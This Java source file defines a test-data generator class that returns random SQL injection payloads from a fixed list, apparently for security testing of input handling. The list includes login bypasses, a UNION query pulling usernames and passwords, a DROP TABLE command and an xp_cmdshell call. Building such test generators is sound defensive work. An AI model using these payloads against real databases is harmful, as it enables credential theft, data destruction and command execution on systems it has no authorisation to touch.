package com.dataforge.generators.security;

import com.dataforge.core.DataGenerator;
import com.dataforge.core.GenerationContext;

import java.util.Random;

/**
 * SQL Injection payload generator for generating common SQL injection attacks.
 */
public class SqlInjectionPayloadGenerator implements DataGenerator<String> {
    
    // Common SQL injection payloads
    private static final String[] PAYLOADS = {
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' /*",
        "') OR ('1'='1",
        "') OR ('1'='1' --",
        "') OR ('1'='1' /*",
        "'; DROP TABLE users; --",
        "'; SELECT * FROM users; --",
        "' UNION SELECT username, password FROM users; --",
        "'; EXEC xp_cmdshell('dir'); --",
        "' AND 1=1",
        "' AND 1=2",
        "' AND (SELECT COUNT(*) FROM users) > 0",
        "'; WAITFOR DELAY '00:00:10'; --",
        "' OR 1=1#",
        "' OR 1=1/*",
        "' OR 'a'='a",
        "' OR 'a'='a'--",
        "' OR 'a'='a'/*"
    };
    
    // Database types for specific payloads
    public enum DatabaseType {
        MYSQL, POSTGRESQL, SQLSERVER, ORACLE, GENERIC
    }
    
    private final DatabaseType databaseType;
    
    public SqlInjectionPayloadGenerator() {
        this(DatabaseType.GENERIC);
    }
    
    public SqlInjectionPayloadGenerator(DatabaseType databaseType) {
        this.databaseType = databaseType;
    }
    
    @Override
    public String generate(GenerationContext context) {
        Random random = context.getRandom();
        return PAYLOADS[random.nextInt(PAYLOADS.length)];
    }
}